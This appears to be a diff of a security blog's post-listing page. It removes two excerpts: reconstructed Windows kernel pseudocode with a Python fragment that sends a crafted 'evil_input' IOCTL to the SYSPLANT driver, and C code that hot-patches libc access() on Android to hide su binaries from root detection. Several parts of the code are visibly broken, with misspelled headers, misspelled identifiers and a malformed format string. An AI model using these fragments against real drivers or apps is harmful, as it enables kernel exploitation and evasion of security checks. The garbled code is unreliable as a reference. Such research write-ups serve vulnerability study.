-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-<span class='line-number'>27</span>
-<span class='line-number'>28</span>
-<span class='line-number'>29</span>
-<span class='line-number'>30</span>
-<span class='line-number'>31</span>
-<span class='line-number'>32</span>
-<span class='line-number'>33</span>
-<span class='line-number'>34</span>
-<span class='line-number'>35</span>
-<span class='line-number'>36</span>
-<span class='line-number'>37</span>
-<span class='line-number'>38</span>
-<span class='line-number'>39</span>
-<span class='line-number'>40</span>
-<span class='line-number'>41</span>
-<span class='line-number'>42</span>
-<span class='line-number'>43</span>
-<span class='line-number'>44</span>
-<span class='line-number'>45</span>
-<span class='line-number'>46</span>
-<span class='line-number'>47</span>
-<span class='line-number'>48</span>
-<span class='line-number'>49</span>
-<span class='line-number'>50</span>
-<span class='line-number'>51</span>
-<span class='line-number'>52</span>
-<span class='line-number'>53</span>
-<span class='line-number'>54</span>
-<span class='line-number'>55</span>
-<span class='line-number'>56</span>
-<span class='line-number'>57</span>
-<span class='line-number'>58</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>#define APC_OBJECT              0
-</span><span class='line'>#define IO_COMPLETION_OBJECT    1
-</span><span class='line'>#define MAX_OBJECT_ID           1
-</span><span class='line'>
-</span><span class='line'>NTSTATUS STDCALL NtAllocateReserveObject(
-</span><span class='line'>    OUT PHANDLE hObject,
-</span><span class='line'>    IN  POBJECT_ATTRIBUTE ObjectAttributes,
-</span><span class='line'>    IN  DWORD ObjectType)
-</span><span class='line'>{
-</span><span class='line'>    PVOID ObjectBuffer;
-</span><span class='line'>    HANDLE hOutputHandle;
-</span><span class='line'>    NTSTATUS NtStatus;
-</span><span class='line'>
-</span><span class='line'>    if (PreviousMode == UserMode) {
-</span><span class='line'>        // Validate hObject
-</span><span class='line'>    }
-</span><span class='line'>    if (ObjectType &gt; MAX_OBJECT_ID) {
-</span><span class='line'>        /* Bail out: STATUS_INVALID_PARAMETER
-</span><span class='line'>         */
-</span><span class='line'>    } else {
-</span><span class='line'>        NtStatus = ObCreateObject(PreviousMode,
-</span><span class='line'>                                    PspMemoryReserveObjectTypes[ObjectType],
-</span><span class='line'>                                    ObjectAttributes,
-</span><span class='line'>                                    PreviousMode,
-</span><span class='line'>                                    0,
-</span><span class='line'>                                    PspMemoryReserveObjectSizes[ObjectType],
-</span><span class='line'>                                    0,
-</span><span class='line'>                                    0,
-</span><span class='line'>                                    &ObjectBuffer);
-</span><span class='line'>        if (!NT_SUCCESS(NtStatus))
-</span><span class='line'>            /* Bail out: NtStatus
-</span><span class='line'>             */
-</span><span class='line'>
-</span><span class='line'>        memset(ObjectBuffer, 0, PspMemoryReserveObjectSizes[ObjectType]);
-</span><span class='line'>
-</span><span class='line'>        if (ObjectType == IO_COMPLETION) {
-</span><span class='line'>            //
-</span><span class='line'>            // Perform some ObjectBuffer initialization
-</span><span class='line'>            //
-</span><span class='line'>            ObjectBuffer[0x0C] = 3;
-</span><span class='line'>            ObjectBuffer[0x20] = PspIoMiniPacketCallbackRoutine;
-</span><span class='line'>            ObjectBuffer[0x24] = ObjectBuffer;
-</span><span class='line'>            ObjectBuffer[0x28] = 0;
-</span><span class='line'>        }
-</span><span class='line'>        NtStatus = ObInsertObjectEx(ObjectBuffer,
-</span><span class='line'>                                    &hOutputHandle,
-</span><span class='line'>                                    0,
-</span><span class='line'>                                    0xF0003,
-</span><span class='line'>                                    0,
-</span><span class='line'>                                    0,
-</span><span class='line'>                                    0);
-</span><span class='line'>        if (!NT_SUCCESS(NtStatus))
-</span><span class='line'>            /* Bail out: NtStatus
-</span><span class='line'>             */
-</span><span class='line'>        *hObject = hOutputHandle;
-</span><span class='line'>    }
-</span><span class='line'>    return NtStatus;
-</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>
-
-
-<h4>DeviceIoControl()</h4>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>BOOL WINAPI DeviceIoControl(HANDLE hDevice,
-</span><span class='line'>                            DWORD dwIoControlCode,
-</span><span class='line'>                            LPVOID lpInBuffer,
-</span><span class='line'>                            DWORD nInBufferSize,
-</span><span class='line'>                            LPVOID lpOutputBuffer,
-</span><span class='line'>                            DWORD nOutBufferSize,
-</span><span class='line'>                            LPDWORD lpBytesReturned,
-</span><span class='line'>                            LPOVERLAPPED lpOverlapped);</span></code></pre></td></tr></table></div></figure>
-
-
-<p>파라메터중에서 중요한 것은 <code>hDevice</code>, <code>dwIoControlCode</code>, <code>lpInBuffer</code>, <code>lpOutputBuffer</code>.</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>dwReturn = c_ulong()
-</span><span class='line'>
-</span><span class='line'>evil_input = "\x41" * 4 + struct.pack("&lt;L", 0x00222084) + "D" * 56
-</span><span class='line'>
-</span><span class='line'>evil_size = len(evil_input)
-</span><span class='line'>einput = create_string_buffer(evil_input, evil_size)
-</span><span class='line'>eoutput = create_string_buffer("\x00" * 1024, 1024)
-</span><span class='line'>driver_handle = kernel32.CreateFilwW( u"\\\\.\\SYSPLANT", GENERIC_READ | GENERIC_WRITE, 0, None, OPEN_EXISTING, 0, None)
-</span><span class='line'>...
-</span><span class='line'>kernel32.DeviceIoControl(driver_handle, 0x00222084, 
-</span><span class='line'>                            addressof(einput), evil_size, 
-</span><span class='line'>                            addressof(eoutput), 1024, 
-</span><span class='line'>                            byref(dwReturn), None)</span></code></pre></td></tr></table></div></figure>
-
-
-<p>이 커맨드가 <code>SYSPLANT.sys</code> 의 <code>DriverDispatcher()</code> 에 날라가면 <code>SYSFER.dll</code> 의 <code>child_block</code> 에 담가둔 오염된 데이터때문에 <code>SYSPLANT.sys</code> 가 뻘짓을 하게 되는 흐름.</p>
-</div>
-  
-  
-
-
-    </article>
-  
-  
-    <article>
-      
-  <header>
-    
-      <h1 class="entry-title"><a href="/blog/2015/05/10/root-detection-on-android-is-useless/">Root Detection on Android Is Useless</a></h1>
-    
-    
-      <p class="meta">
-        
-
-
-
-
-<time class='entry-date' datetime='2015-05-10T21:50:03+09:00'><span class='date'><span class='date-month'>May</span> <span class='date-day'>10</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>9:50 pm</span></time>
-        
-      </p>
-    
-  </header>
-
-
-  <div class="entry-content"><p><a href="http://github.com/serianox/rd">@Serianox_: Root detection on Android is useless, so I wrote 200 lines of (ugly) C to prove it. :3</a></p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-<span class='line-number'>27</span>
-<span class='line-number'>28</span>
-<span class='line-number'>29</span>
-<span class='line-number'>30</span>
-<span class='line-number'>31</span>
-<span class='line-number'>32</span>
-<span class='line-number'>33</span>
-<span class='line-number'>34</span>
-<span class='line-number'>35</span>
-<span class='line-number'>36</span>
-<span class='line-number'>37</span>
-<span class='line-number'>38</span>
-<span class='line-number'>39</span>
-<span class='line-number'>40</span>
-<span class='line-number'>41</span>
-<span class='line-number'>42</span>
-<span class='line-number'>43</span>
-<span class='line-number'>44</span>
-<span class='line-number'>45</span>
-<span class='line-number'>46</span>
-<span class='line-number'>47</span>
-<span class='line-number'>48</span>
-<span class='line-number'>49</span>
-<span class='line-number'>50</span>
-<span class='line-number'>51</span>
-<span class='line-number'>52</span>
-<span class='line-number'>53</span>
-<span class='line-number'>54</span>
-<span class='line-number'>55</span>
-<span class='line-number'>56</span>
-<span class='line-number'>57</span>
-<span class='line-number'>58</span>
-<span class='line-number'>59</span>
-<span class='line-number'>60</span>
-<span class='line-number'>61</span>
-<span class='line-number'>62</span>
-<span class='line-number'>63</span>
-<span class='line-number'>64</span>
-<span class='line-number'>65</span>
-<span class='line-number'>66</span>
-<span class='line-number'>67</span>
-<span class='line-number'>68</span>
-<span class='line-number'>69</span>
-<span class='line-number'>70</span>
-<span class='line-number'>71</span>
-<span class='line-number'>72</span>
-<span class='line-number'>73</span>
-<span class='line-number'>74</span>
-<span class='line-number'>75</span>
-<span class='line-number'>76</span>
-<span class='line-number'>77</span>
-<span class='line-number'>78</span>
-<span class='line-number'>79</span>
-<span class='line-number'>80</span>
-<span class='line-number'>81</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>#include &lt;stdlib.h&gt;
-</span><span class='line'>#include &lt;stdio.h&gt;
-</span><span class='line'>#include &lt;unistd.h&gt;
-</span><span class='line'>#include &lt;fccntl.h&gt;
-</span><span class='line'>#include &lt;errono.h&gt;
-</span><span class='line'>#include &lt;dlfcn.h&gt;
-</span><span class='line'>#include &lt;sys/types.h&gt;
-</span><span class='line'>#include &lt;sys/user.h&gt;
-</span><span class='line'>#include &lt;sys/mman.h&gt;
-</span><span class='line'>#include &lt;sys/syscall.h&gt;
-</span><span class='line'>#include &lt;sys/ptrace.h&gt;
-</span><span class='line'>#include &lt;sys/wait.h&gt;
-</span><span class='line'>#include &lt;linux/user.h&gt;
-</span><span class='line'>
-</span><span class='line'>#define log(...) fprintf(stdout, __VA_ARGS__)
-</span><span class='line'>#define err(...) fprintf(stderr, __VA_ARGS__)
-</span><span class='line'>
-</span><span class='line'>const unsigned long CPSR_T = 0x00000020u;
-</span><span class='line'>
-</span><span class='line'>int shim_access(const char * path, int mode)
-</span><span class='line'>{
-</span><span class='line'>    if (strcmp(path, "/system/app/Superuser.apk") == 0)
-</span><span class='line'>        goto err_noent;
-</span><span class='line'>    if (strcmp(path, "/system/xbin/su") == 0)
-</span><span class='line'>        goto err_noent;
-</span><span class='line'>    return syscall(__NR_access, path, mode);
-</span><span class='line'>err_noent:
-</span><span class='line'>    errno = ENOENT;
-</span><span class='line'>    return -1;
-</span><span class='line'>}
-</span><span class='line'>
-</span><span class='line'>#if defined(SHARED)
-</span><span class='line'>static void __attribute__((constructor)) init()
-</span><span class='line'>{
-</span><span class='line'>    log("patching access@%@010x with shim@%#010x...\n", (unsigned) &access, (unsigne) &shim_access);
-</span><span class='line'>
-</span><span class='line'>    uint32_t * src = (uint32_t *) &access;
-</span><span class='line'>    uint32_t * dst = (uint32_t *) &shim_access;
-</span><span class='line'>
-</span><span class='line'>    size_t range = sysconf(_SC_PAGE_SIZE);
-</span><span class='line'>    void * page_base = (void *) ((uint32_t) src & ~(range - 1));
-</span><span class='line'>    void * page_end = page_base + range;
-</span><span class='line'>
-</span><span class='line'>    log("reset memory protection for [%#010x, %#010x[...\n", (unsigned) page_base, (unsigned) page_end);
-</span><span class='line'>
-</span><span class='line'>    if (mprotect(page_base, range, PROT_READ | PROT_WRITE | PROT_EXEC) != 0)
-</span><span class='line'>        exit(EXIT_FAILURE);
-</span><span class='line'>
-</span><span class='line'>    0x0[src] = ( 0xe59f3000); // ldr r3, [pc]
-</span><span class='line'>    0x1[src] = ( 0xea000000); // b +4
-</span><span class='line'>    0x2[src] = ((uint32_t) dst); // .word dst
-</span><span class='line'>    0x3[src] = ( 0xe12fff13); // bx r3
-</span><span class='line'>
-</span><span class='line'>    if (mprotect(page_base, range, PROT_READ | PROT_EXEC) != 0)
-</span><span class='line'>        exit(EXIT_FAILURE);
-</span><span class='line'>    
-</span><span class='line'>    log("syscall patched!\n");
-</span><span class='line'>}
-</span><span class='line'>#endif
-</span><span class='line'>
-</span><span class='line'>static char * get_image_path()
-</span><span class='line'>{
-</span><span class='line'>    char buffer[1024];
-</span><span class='line'>    char * image_path;
-</span><span class='line'>    int length; 
-</span><span class='line'>
-</span><span class='line'>    length = readlink("/proc/self/exe", buffer, sizeof buffer);
-</span><span class='line'>    buffer[length] = '\0';
-</span><span class='line'>    asprintf(&image_path, "%s", buffer);
-</span><span class='line'>    memcpy(&(strlen(image_path) - strlen("rd-patch"))[image_path], "librd.so", strlen("librd.so") + 1);
-</span><span class='line'>    return image_path;
-</span><span class='line'>}
-</span><span class='line'>
-</span><span class='line'>static void dump_registers(struct user_regs * regs)
-</span><span class='line'>{
-</span><span class='line'>    log(" r0=%#010lx   r1=%#010lx   r2=%#010lx   r3=%#010lx\n", 0x0[regs-&gt;uregs], 0x1[regs-&gt;uregs], 0x2[regs-&gt;uregs], 0x3[regs-&gt;uregs]);
-</span><span class='line'>    log(" r4=%#010lx   r5=%#010lx   r6=%#010lx   r7=%#010lx\n", 0x4[regs-&gt;uregs], 0x5[regs-&gt;uregs], 0x6[regs-&gt;uregs], 0x7[regs-&gt;uregs]);
-</span><span class='line'>    log(" r8=%#010lx   r9=%#010lx  r10=%#010lx  r11=%#010lx\n", 0x8[regs-&gt;uregs], 0x9[regs-&gt;uregs], 0xa[regs-&gt;uregs], 0xb[regs-&gt;uregs]);
-</span><span class='line'>    log("r12=%#010lx   sp=%#010lx   lr=%#010lx   pc=%#010lx\n", 0xc[regs-&gt;uregs], 0xd[regs-&gt;uregs], 0xe[regs-&gt;uregs], 0xf[regs-&gt;uregs]);
-</span><span class='line'>    log("            cpsr=%#010lx\n", 0x10[regs-&gt;uregs]);
-</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>
-
-</div>
-  
-  
-
-
-    </article>
-  
   <div class="pagination">
     
       <a class="prev" href="/posts/9">&larr; Older</a>
@@ -2004,23 +1401,23 @@ kernel memory, when exploiting custom vulnerabilities.</p>
   <ul id="recent_posts">
     
       <li class="post">
+        <a href="/blog/2016/06/14/the-poisoned-nul-byte/">The Poisoned NUL Byte</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2016/06/14/plaidctf-ctf-2015-plaiddb/">PlaidCTF CTF 2015: PlaidDB</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2016/06/14/glibc-adventures-the-forgotten-chunks/">Glibc Adventures: The Forgotten Chunks</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2016/06/14/hitcon-ctf-2014-unexploitable-heap-overflow/">Hitcon Ctf 2014 Unexploitable Heap Overflow</a>
+      </li>
+    
+      <li class="post">
         <a href="/blog/2016/06/13/poison-null-byte/">Poison NULL Byte</a>
-      </li>
-    
-      <li class="post">
-        <a href="/blog/2016/06/13/control-flow-enforcement-technology-preview/">Control-flow Enforcement Technology Preview</a>
-      </li>
-    
-      <li class="post">
-        <a href="/blog/2016/06/13/cve-2016-2468/">CVE-2016-2468</a>
-      </li>
-    
-      <li class="post">
-        <a href="/blog/2016/05/03/security-analysis-of-emerging-smart-home-applications/">Security Analysis of Emerging Smart Home Applications</a>
-      </li>
-    
-      <li class="post">
-        <a href="/blog/2016/04/26/rsa-sample-number/">RSA Sample Number</a>
       </li>
     
   </ul>
